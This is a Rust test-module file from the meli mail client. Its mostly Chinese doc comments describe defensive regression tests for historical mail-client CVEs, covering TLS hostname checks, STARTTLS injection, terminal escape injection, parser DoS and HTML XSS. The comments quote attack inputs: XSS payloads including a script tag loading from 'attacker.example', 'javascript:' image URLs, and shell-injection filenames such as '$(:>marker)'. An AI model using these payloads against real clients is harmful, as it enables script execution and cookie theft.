///（`Connection::Tls` 包 `native_tls::TlsStream`，无任何 CN / 主机名逻辑）；
/// 主机名校验策略全在 native-tls（Linux=OpenSSL 的 `X509_check_host` 语义）
/// 内部，入口在三处 `connector.connect(&path, socket)`——
/// `melib/src/imap/connection.rs`（path=`server_conf.server_hostname`）、
/// `melib/src/nntp/connection.rs`、`melib/src/smtp.rs`（path=`server_conf.hostname`）；
/// 三处 `TlsConnector::builder()` 都是默认校验器，只有账号配置显式打开
/// `danger_accept_invalid_certs` 时才追加危险开关，全仓无
/// `danger_accept_invalid_hostnames`；JMAP 的 isahc 客户端
///（`melib/src/jmap/connection.rs`、`eventsource.rs`）三个 `danger_*`
///（certs/hosts/revoked）由同一账号开关门控；四个账号配置默认全是 `false`，
/// `SmtpSecurity::default` 亦然。workspace 无 rustls / webpki，也无
/// `X509_check_host`/`verify_callback`/自定义 CN 解析代码。
///
/// **为何单元级 mock**：`native-tls`/`openssl` 不是 melib 公开 API，`cve` 依赖
/// 只有 `meli`，issue 约束「不新增 test-only 依赖」，melib 亦无 TLS 服务器实现，
/// 故按 issue 允许的「真实证书语料 + 单元级 mock」做免疫证明。语料是 openssl
/// 离线生成的真实 ECDSA P-256 证书（受信根 + 四张由它直接真实签名的叶子：
/// L_MATCH 正确基线 `good.example`、A1 名字不匹配 `evil.example`、A2 的 CN 内嵌
/// `\0`（`good.example\0evil.example`，25 字节、无 SAN）、A3 的 SAN dNSName 内嵌
/// `\0` 且 CN 干净），`openssl verify` 转录逐字内嵌（无主机名校验四叶全 `OK`；
/// 带 `-verify_hostname good.example` 时 L_MATCH `OK`、A1/A2/A3 全 `error 62
/// hostname mismatch`）。
///
/// [`cve_2009_3766`] 分层锁定：(a) 语料真实性——四叶 issuer TLV 逐字节等于受信
/// 根 subject TLV，A2 的 CN 恰为 `good.example\0evil.example`（25 字节、无 SAN），
/// A3 的 SAN 内嵌 `\0` 而 CN 干净，SPKI 互异，DER 长度与 `asn1parse` NUL 证据
/// 命中；(b) 攻击复现——旧 mutt 三面缺陷谓词（完全不比主机名 / CN 截断到首个
/// `\0` / SAN 全量比较失败后回退 CN）对 L_MATCH/A1/A2/A3 全部接受；(c) 核心
/// 断言——RFC 6125 正确语义只接受 L_MATCH，A1/A2/A3 全拒绝，**NUL 不截断比较**：
/// 含 NUL 的 CN/SAN 永不匹配（即使其 NUL 前缀恰等于 `good.example`），SAN 在场
/// 即权威且绝不回退 CN；(d) L3 源码 / manifest 扫描锁定三处 connector 的默认
/// 校验器 + 门控 danger + 主机名、`utils/connections.rs` 仅传输包装、账号配置
/// 默认 false、无自定义主机名校验面、TLS 栈为 native-tls，以及可直达的
/// [`SmtpSecurity::default`] danger=false。
/// 结论：**免疫证明，未发现缺口，未触碰生产代码**。
///
/// [`cve_2009_3766`]: self::cve_2009_3766
/// [`SmtpSecurity::default`]: meli::melib::smtp::SmtpSecurity
#[cfg(test)]
#[path = "CVE-2009-3766.rs"]
mod cve_2009_3766;

/// CVE-2020-15917（Claws Mail < 3.17.6，CVSS 9.8，NVD；CWE-345/CWE-346）
/// STARTTLS 明文后缀注入 regression（issue #90，表 5 协议信任边界 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md`）：MITM 在 IMAP `STARTTLS` 的 tagged OK
///（`M1 OK Begin TLS negotiation now\r\n`）之后向同一 TCP 连接注入明文响应
/// 行；Claws Mail `session.c` 的会话缓冲跨 TLS 升级存活，残留明文被当作升级
/// 后的「安全」响应解析，中间人据此在 TLS 会话内伪造 CAPABILITY/认证/SELECT
/// 结果。注入变体：黏连同段、分段到达、夹在 greeting 与 tagged OK 之间、或
/// 在客户端 ClientHello 之后继续注入明文。
///
/// meli 等价面：issue 指定 `melib/src/imap/connection.rs` 的 STARTTLS 升级
///（等价面 SMTP / NNTP 同型）。`if server_conf.use_starttls` 块里的协商缓冲
/// 是**块内局部变量**，看到 tagged `M1 OK` break 后整体丢弃；TLS 升级直接包裹
/// 裸 socket，内核缓冲里的残留明文只会进 TLS 记录层 → 握手失败（fail-closed）；
/// 升级后首个响应必来自 TLS 会话内（IMAP/NNTP 重发 CAPABILITY，SMTP 重发
/// EHLO，post-TLS 读取用全新缓冲）。因此后缀注入类在 meli 上不可能成为升级后
/// 的响应。
///
/// 本次攻击模拟暴露并修复了一个真实缺口（交付物 A）：IMAP / NNTP 的 TLS 握手
/// 块在 `AsyncWrapper::into_inner()` 之后没有恢复阻塞模式（async-io 2.x 的
/// `into_inner` 文档明确要求调用方 `set_nonblocking(false)`；SMTP 早有此调用），
/// 于是 native-tls 返回 `HandshakeError::WouldBlock` 中间流后，无超时的
/// `loop { handshake() }` 在非阻塞 fd 上**热自旋（100% CPU）**——敌意服务器
/// 应答 tagged OK 后保持沉默即可让客户端永久烧 CPU。修复：恢复阻塞模式、施加
/// 账号读写超时，并在 WouldBlock 循环里加握手截止时间（`ErrorKind::TimedOut`）。
///
/// [`cve_2020_15917`] 分层锁定：(a) 攻击复现——Claws Mail 式跨升级会话缓冲对
/// S1 语料逐行吐出注入的 `* CAPABILITY …` / `M2 OK …` / `* 3 EXISTS`；(b) meli
/// 语义核心断言——按 425-533 行真实算法复刻，每个变体要么协商 Err，要么升级且
/// 携带过升级的缓冲恒为空，OK 前未打标脏行必须协商失败；(c) 行为级攻击——本地
/// 敌意服务器打真实 `ImapStream::new_connection`（黏连 / 分段 / OK 前 /
/// ManageSieve / 沉默 MITM 五场景），客户端须进入 TLS（服务器读到 `0x16 0x03`）、
/// TLS 流内不得含明文 IMAP 命令、注入后被 drop 必须 Err、沉默服务器须在账号
/// 超时内以 `TimedOut` 返回而非热自旋到对端 drop；(d) L3 源码 / 工程扫描锁定
/// imap / nntp / smtp 三处升级块的阻塞恢复 + 超时 + deadline + 升级后重发命令，
/// 且 `ImapStream` 不含 `read_buffer`/`Vec<u8>` 跨升级残留缓冲。
/// 结论：**后缀注入类免疫；沉默服务器缺口发现并修复**。
///
/// [`cve_2020_15917`]: self::cve_2020_15917
/// [`ImapStream::new_connection`]: meli::melib::imap::ImapStream::new_connection
#[cfg(test)]
#[path = "CVE-2020-15917.rs"]
mod cve_2020_15917;

/// Pager OSC 8 hyperlink URL sanitization regression (issue #97,
/// follow-up to CVE-2024-37384 / issue #74): the pager renders text
/// mail bodies and any URL it `linkify`-extracts becomes the OSC 8
/// payload via `Screen::draw_horizontal_segment`. Previously the URL
/// was interpolated **raw** into `\x1b]8;...;{url}\x07`, so a mail
/// body URL containing BEL/ST would early-terminate the OSC 8
/// sequence and turn the trailing bytes into live terminal commands
/// (`ESC[2J`, OSC 52 clipboard write, RIS, ...). The fix mirrors the
/// `window_title` fix one-for-one: route the URL through
/// [`sanitize_osc_payload`] (strips all `char::is_control` - C0/DEL/C1)
/// before interpolating it; when the sanitized URL is empty, emit no
/// OSC 8 at all. The link **text** still renders - the pager uses the
/// link text regardless - so the visual layout is unchanged; only the
/// OSC 8 control sequence is sanitized.
///
/// [`osc8_pager_hyperlink_sanitization`] drives the corpus through
/// the production `Hyperlink::write_start_sanitized` path and
/// through the production `Screen::<Tty>::draw_horizontal_segment`
/// emitter: every URL with control bytes produces an OSC 8 with a
/// body that is the URL minus its control bytes (and exactly one BEL
/// terminator); a control-only URL emits no OSC 8 at all; an honest
/// URL is byte-identical to the unsanitized path. Fix in
/// [`crate::cve_2024_37384`] (issue #74) for the configuration-side
/// precedent.
///
/// [`sanitize_osc_payload`]: meli::terminal::sanitize_osc_payload
#[cfg(test)]
#[path = "OSC8-pager-hyperlink.rs"]
mod osc8_pager_hyperlink_sanitization;

/// CVE-2021-31855（KMail / Messagelib ≤ 5.17.0；CVSS 3.1 6.5，CWE-312
/// 「Cleartext Storage of Sensitive Information」）**删除已解密邮件附件时把
/// 明文正文回传服务器** regression（issue #103）。KMail 的
/// `ViewerPrivate::deleteAttachment` 在查看远端（IMAP）存储、已解密的加密
/// 邮件时，用户删除某个附件会让处理函数把**解密后的 session 明文正文**
/// 重新组装并写回服务器；能读取服务端存储者因此拿到本应只存在于受害者
/// 会话内的明文。
///
/// meli 的等价面只在 composer：从已存储邮件进入 composer 的唯一入口是
/// view 的 `edit` 快捷键 → `Composer::edit` → [`Draft::edit`]，附件删除是
/// `ComposerTabAction::RemoveAttachment` 的
/// `self.draft.attachments_mut().remove(idx)`，回传是 [`Draft::finalise`] →
/// `save_draft`/`save_special` → IMAP `APPEND`。对 `multipart/encrypted`，
/// 解析层的 `body.text()` 为空、`body.attachments()` 是线上部件 raw 的克隆，
/// 解析层从不解密；解密只发生在 view-filter 层并只构造显示用 `Attachment`，
/// 绝不进入 `Draft`——所以删除附件后的序列化仍是原样密文。
///
/// [`cve_2021_31855`] 用 gpg 2.4.9 离线生成的真实 PGP/MIME 语料（cv25519
/// 子钥，PKESK v3 + MDC 保护 SEIPD v1，CRC-24 与包形状在测试内重算；解密
/// inner 实体是 `multipart/mixed`：含 SECRET 标记的 text/plain 正文 + 含
/// 机密附件名标记的附件 part）分层锁定：L1 解析面 `text()`/`decode_rec()`
/// 无明文、L2 `Draft::edit` 只装载线上密文 raw、L3 逐个 `remove(idx)` 及删空
/// 变体的 `finalise()` 输出无任何明文标记且未删 armor 逐字保留、L4 源码扫描
/// 证明写回面只承载调用方 bytes。结论：**免疫证明，未发现缺口，未触碰生产
/// 代码**；CVE 的「删除附件 → 明文正文回传」原语在 meli 中不可表达。
///
/// [`Draft::edit`]: meli::melib::Draft::edit
/// [`Draft::finalise`]: meli::melib::Draft::finalise
#[cfg(test)]
#[path = "CVE-2021-31855.rs"]
mod cve_2021_31855;

/// CVE-2019-10732（KMail ≤ 5.2.3 解密预言机/回复泄露；issue #104）回归：
/// [`cve_2019_10732`] 用嵌藏 PGP/MIME 密文的 `multipart/mixed` 载体（复用
/// issue #103 的抛弃子钥语料充当「窃得的密文」）攻击 meli 的两个回复面：
/// melib 的 [`Draft::new_reply`]→[`Attachment::decode_rec`]（曾把整个加密容器
/// 的 wire 密文灌进引用，已修复为加密子树贡献空）与 meli UI 的
/// `EnvelopeView::body_text` 回复引用（view-filter 曾把嵌藏加密部件**自动解密
/// 出的明文**放进引用——CVE 的解密预言机原语在 meli 中可表达，已修复为
/// decrypt-origin 子树渲染可读、拒入回复镜像；端到端回归在
/// `meli/src/mail/view/tests.rs`）。断言引用与「不含密文的普通 multipart
/// 邮件」逐字一致、无密文字节、无解密明文标记。
///
/// [`Draft::new_reply`]: meli::melib::Draft::new_reply
/// [`Attachment::decode_rec`]: meli::melib::email::Attachment::decode_rec
#[cfg(test)]
#[path = "CVE-2019-10732.rs"]
mod cve_2019_10732;

/// CVE-2020-16947（Microsoft Outlook 2016 / Office 2019 / Microsoft 365
/// Apps for Enterprise，Windows；CVSS 7.5）打开特制文件/邮件时的内存破坏
/// RCE regression（issue #105，表 2 病毒/代码执行 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md`）：NVD/MSRC 记录 Outlook 在打开特制
/// 文件或邮件时「未正确处理内存对象」，攻击者可以目标用户权限执行任意
/// 代码；微软未披露具体原语。meli 不链接 MAPI store、COM 运行时、表单
/// 引擎或脚本宿主，字面上的「内存破坏 → 执行」没有可运行的代码路径，故
/// 按 issue 要求做等价面免疫证明：Windows 专属的内存破坏 → meli 的整个
/// 「接收 → 解析 → 显示」输入面。
///
/// [`cve_2020_16947`] 分层锁定六类语料：(a) 超过 100 层的
/// `multipart/*` 嵌套（含 100/101 精确边界与 150 层）建树必须被
/// `MAX_MULTIPART_NESTING_DEPTH` 截断、第 100 层之后退化为不透明
/// `ContentType::OctetStream` 叶，整树遍历/decode 不 panic——复用 C4 的
/// multipart 递归上限；(b) 12 层 `message/rfc822` 递归链的
/// [`Attachment::decode_rec`] 必须命中 `MAX_RFC822_DECODE_NESTING_DEPTH`
/// (8) 并在越界处退化为惰性 `b"message/rfc822 attachment"` 标记，浅层
/// （≤8 跳）仍解出内层正文——复用 CVE-2004-1944 的 hop 上限；(c) ≥256 KiB
/// 单行头（超长 `Subject`/`X-Long`、超长无冒号行、超长折叠头）经
/// `parser::mail` / `headers::headers` / `Envelope::from_bytes` 解析，
/// 不 panic、结果确定、时间有界，且超长 `Subject` 逐字节保留（证明耗时
/// 来自线性工作而非截断）；(d) 截断/残缺 boundary（声明的 boundary 无完整
/// 分界行、只在前后缀出现、EOF 落在 dash-boundary 中间、缺闭合分界、
/// 闭合分界截断）要么干净报错要么产出 ≤100 层的有界完整树，绝不空转或越界
/// 切片（CWE-835 进度保证与 CWE-1287 EOF 保证）；(e) 非法 `Content-Type`
/// 参数（参数截断、引号未闭合、重复 boundary、boundary 含非法字符/为空、
/// type/子类型为空或超长、NUL 参数），容错分类、不 panic，尤其**空
/// boundary 不得造成无限循环或退化 panic**，容器退化为零部件；(f) 恶意
/// `Date`（10 万层嵌套注释、`99:99:99`、9999 年、多空白折叠、垃圾尾部、
/// 空值）经 [`rfc5322_date`] 与 envelope 全链路，Ok/Err 皆不 panic、时间
/// 有界（注释扫描器是迭代式，strptime 回退是线性）。
///
/// 结论：**免疫证明，未发现缺口，未触碰生产代码**——语料中的每个字节要么
/// 成为惰性 `Attachment`/时间戳数据，要么是干净的 `Err`；安全 checked Rust
/// 无 MAPI 固定缓冲区可溢出，深度与宽度分别由上述上限约束。
///
/// [`Attachment::decode_rec`]: meli::melib::email::Attachment::decode_rec
/// [`rfc5322_date`]: meli::melib::email::parser::dates::rfc5322_date
#[cfg(test)]
#[path = "CVE-2020-16947.rs"]
mod cve_2020_16947;

/// CVE-2009-0587（Evolution Data Server < 2.24.5；libcamel
/// `camel-mime-utils.c` 与通讯录 `e-vcard.c`；CVSS v2 7.5）超长字符串
/// 转 base64 表示的整数溢出 → RCE regression（issue #106，表 2 病毒/代码
/// 执行 of `SECURITY-CVE-RESEARCH.zh-CN.md`）：把超长附件/正文串转换为
/// base64 时，原生 `int` 长度运算（`len * 4 / 3` 一类）回绕，用回绕后的
/// 长度分配缓冲区，随后的拷贝/编码越界写入；通讯录 `e-vcard.c` 的 base64
/// 转换同型，因此携带 vCard 的邮件本身即投递向量。meli 不链接 libcamel /
/// Evolution 通讯录，等价面按 issue 指定映射到 meli 自身的两处
/// 「字节串 ↔ base64」转换与 vCard 解析：
///
/// 1. MIME 传输编码（`melib/src/email/attachments.rs`）：解码侧是
///    `decode_helper` 的 `ContentTransferEncoding::Base64` 分支
///    （`data_encoding::BASE64_MIME.decode(self.body())`，`Err` 时整体回退
///    原始 body 字节），编码侧是 `into_raw_helper` 的两处
///    `BASE64_MIME.encode(...)`（`ContentType::OctetStream` 与非常规
///    `ContentType::Other` 分支）——`camel-mime-utils.c` 的直接对应。
/// 2. vCard 属性（`melib/src/utils/vobject/vcard.rs`）：`Vcard::build`
///    （`parse_component` → `from_component`）把每个属性值存为自有
///    `String`，`PHOTO` / `KEY` 的 `ENCODING=BASE64` 巨型值因此成为解析器
///    内的超长受控串，正是 `e-vcard.c` 转换越界的输入；meli 解析期从不对
///    vCard 属性做 base64 解码，getter 原样返回。
///
/// [`cve_2009_0587`] 分层锁定语料并给出免疫依据：(A) MIME 面——4 MiB /
/// 16 MiB 合法 base64 完整邮件解码成功、不 panic、时间有界且
/// `解码长度 ≤ 输入 × 3/4 + 3`（绝不放大；用 `ABC` 重复逐字节反查真实
/// 解码而非回退）；缺/多 `=`、截断末组、非法字母（NUL、高位字节、`*`、
/// `!`、SP/TAB）全部被 `BASE64_MIME.decode` 拒绝并逐字节回退原始 body，
/// CRLF/LF/CR 换行属声明忽略集而正常解码；编码侧断言
/// `规范 base64 长度 ≤ 输入 × 4/3 + 4` 且 `decode(encode(x)) == x`
/// 在 0/1/2/3 字节及 76 列边界、1 MiB 规模全部成立。(B) vCard 面——4 MiB /
/// 16 MiB 的 `PHOTO` / `KEY` base64（折叠与非折叠）解析为 `Ok`、getter
/// 取回全长、`write_component` 折叠/展开往返逐字节保留；截断、缺
/// `BEGIN`/`END`、标签不匹配、多字节 UTF-8 折叠均干净 `Err` 或有界 `Ok`，
/// 无 panic。
///
/// 免疫依据：`data_encoding` 2.11 的长度运算为 checked 语义——
/// `Encoding::encode_len` 先断言 `len <= usize::MAX / 512` 再算
/// `div_ceil(8 * len, 6)`，`Encoding::decode_len` 先断言
/// `len <= usize::MAX / 8`，任何可驻留内存的输入都无法回绕；且解码失败
/// 走全量 `self.body().to_vec()`，不产生部分或有界外分配。meli 为安全
/// Rust，无 `int` 型长度乘积、无长度派生缓冲上的 `memcpy`、无
/// `e-vcard.c` 式 base64 分配器。结论：**免疫证明，未发现缺口，未触碰
/// 生产代码**。
#[cfg(test)]
#[path = "CVE-2009-0587.rs"]
mod cve_2009_0587;

/// CVE-2000-0481（KMail < 1.0.29；CWE-120/121/122 缓冲区溢出家族）
/// `Content-Disposition: attachment; filename="<超长名>"` 附件名固定大小
/// 缓冲区溢出 regression（issue #107，表 2 病毒/代码执行 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md`）：KMail 把附件名拷进固定大小缓冲，
/// 64 KiB+ 的文件名越界写（DoS，可能代码执行）——名字的长度本身就是武器。
/// meli 无任何固定大小文件名字节缓冲：MIME 参数值落在按到达长度分配的堆
/// `String` 里，KMail 的原语没有可运行的代码。等价面 mapped to 三处：
///
/// 1. `melib/src/email/attachments.rs` 的 `Attachment::filename()`（解析见
///    `melib/src/email/parser.rs` 的 `content_disposition` /
///    `content_disposition_parameter`）；
/// 2. `meli/src/mailcap.rs` 的 `expand_nametemplate` / `expand_args` /
///    `quote_shell_word` / `encode_for_context`——文件名只作为 `%s` 临时文件
///    hint，真正替换进命令的是生成的临时路径并按 shell 上下文 armor；
/// 3. `meli/src/types/helpers.rs` 的 `File::create_temp_file`
///    （`sanitize_filename` + `cap_filename_component_bytes`，
///    `FILENAME_COMPONENT_MAX_BYTES = 192`）。
///
/// [`cve_2000_0481`] 分层锁定：(L1) 64 KiB / 1 MiB 名在 quoted / token /
/// `Content-Type: name=` 三种拼写下经 `Mail::new` 构树、`filename()` 全长
/// 字节保真、`catch_unwind` 不 panic、时间有界、两次独立解析确定一致，
/// `Display` / `Debug` / `check_if_has_attachments_quick` 均不 panic，且
/// `../`、`\`、引号、反引号、`$()` 与 RFC 2047 走私的 LF/CR/NUL 名全部
/// 原样或按声明的折行规范化浮现；(L2) 同一超长名在普通默认栈工作线程
/// （约 2 MiB）内解析并全长取回，证明名字在堆上存储、栈消耗不随名字长度
/// 增长——KMail 固定缓冲溢出的等价面映射；(L3) 复用 CVE-2020-12641 的
/// marker 端到端模式，`echo "%s"`、反引号、`$(...)`、单引号四种 shell
/// 上下文与 `nametemplate=%s.html` 下，附件文件名携带 `$(:>marker)`、
/// 反引号 `:>marker`、引号逃逸、`;|` 载荷时 marker 绝不出现、命令正常退出、
/// `%s` 恰展开为单一实参（生成的 `<tmp>/meli/...` 临时路径）；(L4)
/// `File::create_temp_file` 以 64 KiB 'A' hint 落盘时组件 ≤
/// NAME_MAX(255) / `FILENAME_COMPONENT_MAX_BYTES`、平坦无穿越、位于
/// `<tmp>/meli/`、权限 0o600 无执行位、内容保真。
///
/// 结论：**免疫证明，未发现缺口，未触碰生产代码**——长度与字节两轴分别由
/// CVE-2003-0376 的落盘组件上限（本 CVE 家族可用性面）与 CVE-2020-12641 的
/// 上下文感知 shell armor 覆盖并在本 CVE 自身的纯长度与元字符形态上复锁；
/// 安全 checked Rust 没有固定缓冲可溢出。
#[cfg(test)]
#[path = "CVE-2000-0481.rs"]
mod cve_2000_0481;

/// CVE-2021-32055（mutt 1.11.0–<2.0.7 与 neomutt < 2020-11-27；CVSS 9.1，
/// CWE-125 越界读取）序列集尾随逗号 OOB 读取 regression（issue #108，表 2
/// 病毒/代码执行 of `SECURITY-CVE-RESEARCH.zh-CN.md`）：仅当非默认
/// `$imap_qresync` 打开时，服务器返回 `* VANISHED (EARLIER) 1,2,3,` 或
/// `* SEARCH 1,2,` 这类**以逗号结尾**的序列集，mutt 的 `imap/util.c`
/// 序列集解析器会把结尾空段之后的游标走出缓冲区，相邻内存被当作解析
/// 结果读出（纯读取原语，末尾空段是武器）。
///
/// meli 等价面 mapped to 四层（安全 Rust 无 C 游标可越界）：
///
/// 1. `melib/src/imap/protocol_parser.rs` 的 `untagged_responses`——`* `
///    之后强制 `digit1` 消息号，`VANISHED` 行在数字文法处确定性失败
///    （nom `Digit` 错误）；`* 1,2,3, EXPUNGE` 在必需空格分隔符处失败；
///    只有分隔正确的 `* 1 ,2,3, EXPUNGE` 才进入未知 tag 分支并被丢弃为
///    `None`——永不被当作序列集解析。
/// 2. `search_results` 字段校验——每个结果字段是单个 `ImapNum` token
///    （`is_not(" \r\n")` + `usize::from_str`），逗号属于字段本身，故
///    尾随逗号 / 空段 / 范围冒号全部确定性 `Err`；RFC 3501 空格分隔形
///    `* SEARCH 1 2 3` 精确解析，空应答解析为空表。
/// 3. `fetch_response` / `fetch_responses`——`UID` 后出现 `,` 落入未知
///    token 分支、空 UID 字段失败 `UID::from_str`，绝不产生部分 UID；
///    `raw_fetch_value = &input[..i]` 的 `i` 是 CVE-2020-9818 已夹紧的
///    索引运算，切片必在输入缓冲内（本 CVE 的 CWE-125 面）。
/// 4. imap-types 类型层（`melib/src/imap/mod.rs` 的 `pub extern crate
///    imap_codec`）——`SequenceSet::from_str` 按 `,` 切分、逐段解析
///    `Sequence`，尾随逗号产生的空段使 `SeqOrUid::from_str` 失败，
///    `Vec1` 拒绝空集合：mutt 触发原形永远无法成为值；`0` / 前导零 /
///    `4294967296` 被 `nz-number` 文法拒绝；
///    `SequenceSet::try_from(Vec::<NonZeroU32>::new())` 返回 `Empty`，
///    锁住 `set_flags` / `expunge` 命令构造处的 `.unwrap()` 站点。
///
/// [`cve_2021_32055`] 以六个分层 `#[test]` 锁定：VANISHED 未标记分发
/// fail-closed、SEARCH 字段校验、FETCH 畸形 UID fail-closed、FETCH 合法
/// 形态 exact 值与 `raw_fetch_value` 缓冲内断言、类型层空段/文法拒绝与
/// 合法结构对照、以及全语料一次 `catch_unwind` + 两次独立运行指纹逐字节
/// 一致（证明无 panic、无相邻内存影响）。两处如实记录的观察：(1)
/// `* SEARCH 1,2,3` 是 `Err` 而非 issue 草稿预期的 `Ok([1,2,3])`——本读取
/// 器的字段文法就是空格分隔的单个 `ImapNum`，逗号形更早 fail-closed，属于
/// 防御加强而非削弱断言；(2) `+1` 因 Rust `NonZeroU32::from_str` 接受前导
/// 正号而被 imap-types 接受为 `Value(1)`——上游文法宽松，非本 CVE 触发
/// 原形（仍有良构单元素集合、无空段、无 OOB/panic/hang），且所有生产
/// `SequenceSet` 调用点（`untagged.rs`、`fetch.rs`、`connection.rs`、
/// `sync/mod.rs`、`mod.rs`）都从数值 / `NonZeroU32` / range 构造，从不解析
/// 服务器字符串，故不是可达攻击面。结论：**免疫证明，未发现缺口，未触碰
/// 生产代码**——安全 Rust 无缓冲可越界走，nom 解析器对空段与分隔符违规
/// fail-closed，类型构造器拒绝空集合与越界数字，FETCH 原始切片可证在输入内。
///
/// [`cve_2021_32055`]: self::cve_2021_32055
#[cfg(test)]
#[path = "CVE-2021-32055.rs"]
mod cve_2021_32055;

/// CVE-2002-2086（SquirrelMail < 1.2.6 webmail；`read_body.php` 的
/// `magicHTML()` 清洗不足；CVSS v2 4.3）HTML 邮件跨站脚本 regression
/// （issue #109，表 3 web/HTML 嵌入 of `SECURITY-CVE-RESEARCH.zh-CN.md`）：
/// SquirrelMail 对邮件正文只做单遍标签匹配，于是
/// `<<script>alert(document.cookie)//<</script>`（双尖括号骗过匹配）与
/// `<img src="javascript:alert(document.domain)">`（IMG 标签的
/// `javascript:` URL）可在收件人浏览器执行任意脚本；
/// `<a href="javascript:alert(1)">click</a>` 是同一 URL 原语的锚点等价形。
///
/// meli 等价面 mapped to 唯一一条 HTML 显示链：`meli/src/mail/view/
/// html_render.rs` 的 [`sanitize`]（ammonia：标签白名单不含 script/img，
/// `url_schemes` 仅 http/https/mailto，危险 `href` 还会在 trim 后复检）＋
/// [`render`]（html2text → 终端纯文本），调用点是
/// `meli/src/mail/view/filters.rs` 的 `HtmlFilter::Builtin`。ammonia 用
/// 规范 HTML5 分词器把输入**一次解析**成 DOM、过滤解析树、再转义序列化，
/// 不存在 SquirrelMail 那种单遍字符串匹配可供双尖括号或 `<scr<script>ipt>`
/// 片段欺骗；输出随后交给 html2text，链路上没有任何 JS 引擎。
///
/// [`cve_2002_2086`] 以五个分层 `#[test]` 锁定：
///
/// 1. 公告原形三条 ＋ 绕过狩猎变体（大小写混合、十进制/十六进制/命名实体
///    编码 `&#106;avascript:`/`&#x6A;avascript:`/`&colon;`、Tab/LF/CR 与前导
///    Cf 控制字符插入 scheme、未闭合标签、嵌套白名单标签包裹、
///    `<scr<script>ipt>` 拆分重组、`onerror`/`onclick` 等事件处理器、
///    `vbscript:`/`data:`/`livescript:`/`mocha:` 伪协议）逐条断言 issue 原文
///    四条不变量：`sanitize()` 输出不含 `<script`、不含 `<img`，小写化后
///    不含 `javascript:`；`render()` 纯文本不含脚本源码 `alert(`。
/// 2. 独立拷贝的 INERT_TAG_WHITELIST/INERT_ATTR_WHITELIST 逐标签扫描
///    `sanitize` 输出，并锁定 `sanitize` 为不动点
///    （`sanitize(sanitize(x)) == sanitize(x)`），排除二次解析重组。
/// 3. 嵌入上下文探测：每条语料放进裸片段、`blockquote`、表格单元格、行内
///    强调、完整文档五种上下文（各加倍），证明清洗是解析树上的结构操作、
///    与包裹上下文无关。
/// 4. 端到端：每条语料单独装进完整 RFC 822 邮件，经 `Envelope::from_bytes`
///    / `Attachment` 解析取 HTML 正文，走与 `ViewFilter::new_html` 内置路径
///    一致的 `sanitize` ＋ `render` 链；一封信带全部语料的组合文档另有一
///    测试，断言渲染文本无 `alert(`、无 script/img 标记、无 `javascript:`，
///    且良性 https/mailto 对照锚仍在——证明被拒绝的是 scheme/标签，而不是
///    链接本身。
///
/// 一处如实记录的观察：规范解析会把非标签形（`< img …>`：`<` 后跟空格）与
/// raw-text 元素（`<xmp>`/`<noscript>`）的内容转义为**字面文本**，也会把
/// scheme 中间插入 `U+0001`/`U+000B`/`U+200B`、反引号或前导 NUL 的 href 当
/// 无 scheme 相对引用保留；这些情况下 `javascript:`/`alert(` 子串仍可能
/// 作为惰性文本出现，但既非活标签也非可执行 URL（scheme 位置的控制字符在
/// 任何浏览器里同样解析失败，也通不过 `url_scheme` 的 RFC 3986 文法、不在
/// 默认可启动 scheme 集合里），meli 只把它当链接脚注文本显示。
/// `non_markup_and_schemeless_forms_stay_inert` 锁定这一边界为「无未白名单
/// 标签/属性 ＋ `sanitize` 不动点 ＋ 保留 href 无合法 scheme」。
///
/// 结论：**免疫证明，未发现缺口，未触碰生产代码**——安全 Rust 的 ammonia
/// 解析树白名单没有单遍字符串匹配可被骗，非白名单元素连内容或属性一并剥离，
/// `javascript:`/`vbscript:`/`data:` 等 scheme 被白名单与 href 复检共同拒绝，
/// html2text 只产生纯文本。
///
/// [`cve_2002_2086`]: self::cve_2002_2086
/// [`sanitize`]: meli::mail::view::html_render::sanitize
/// [`render`]: meli::mail::view::html_render::render
#[cfg(test)]
#[path = "CVE-2002-2086.rs"]
mod cve_2002_2086;

/// CVE-2002-1649（SquirrelMail < 1.2.3 webmail；`read_body.php` 的
/// `magicHTML()` 清洗不足；CVSS v2 4.3）HTML 邮件跨站脚本 regression
/// （issue #110，表 3 web/HTML 嵌入 of `SECURITY-CVE-RESEARCH.zh-CN.md`），
/// 与已完成的同族后续版本 CVE-2002-2086（issue #109）共享原语但锚点不同：
/// SquirrelMail 对邮件正文只做单遍标签匹配，于是两类正文载荷可在收件人
/// 浏览器执行任意脚本——
///
/// 1. 本 CVE 特有的双尖括号（`<<`）注入变体带外部脚本源：
///    `<<script src=//attacker.example/x.js><</script>`（第一个 `<` 被单遍
///    匹配当作普通字符，剩下的 `<script src=…>` 逃逸并加载攻击者脚本）；
/// 2. IMG 标签的 `javascript:` URL：
///    `<img src="JaVaScRiPt:alert(document.cookie)">`（大小写混写）与
///    `<img src=javascript:alert(1)>`（无引号）。
///
/// meli 等价面 mapped to 唯一一条 HTML 显示链：`meli/src/mail/view/
/// html_render.rs` 的 [`sanitize`]（ammonia：标签白名单不含
/// script/img/iframe/object/embed，`url_schemes` 仅 http/https/mailto，
/// 危险 `href` 还会在 trim 后复检；`script` 属 `clean_content_tags`，连
/// 内容一并删除）＋ [`render`]（html2text → 终端纯文本），调用点是
/// `meli/src/mail/view/filters.rs` 的 `HtmlFilter::Builtin`。ammonia 用
/// 规范 HTML5 分词器把输入**一次解析**成 DOM、过滤解析树、再转义序列化，
/// 不存在 SquirrelMail 那种单遍字符串匹配可供双尖括号或 `<scr<script>ipt>`
/// 片段欺骗；输出随后交给 html2text，链路上没有任何 JS 引擎。
///
/// [`cve_2002_1649`] 以六个分层 `#[test]` 锁定：
///
/// 1. 公告原形三条 ＋ 绕过狩猎变体（以本 CVE 的 IMG `javascript:` URL 与
///    `<<script src=…>` 外部脚本原语为轴心：大小写混合、十进制/十六进制/
///    命名实体编码 `&#106;avascript:`/`&#x6A;avascript:`/`&colon;`、Tab/LF/CR
///    与前导 Cf 控制字符插入 scheme、无引号 img src、`onerror`/`onload` 事件
///    处理器、外部 `src=` 脚本源（`script`/`iframe`/`object`/`embed`）、
///    `<i<img>mg>`/`<img sr<script>c=…>`/`<scr<script>ipt>` 拆分重组、
///    `vbscript:`/`data:`/`livescript:`/`mocha:` 伪协议，以及 IMG URL 的
///    `a[href]` 等价形）逐条断言 issue 原文四条不变量：`sanitize()` 输出
///    不含 `<img`、不含 `<script`，小写化后不含 `javascript:`；`render()`
///    纯文本不含脚本源码 `alert(`。
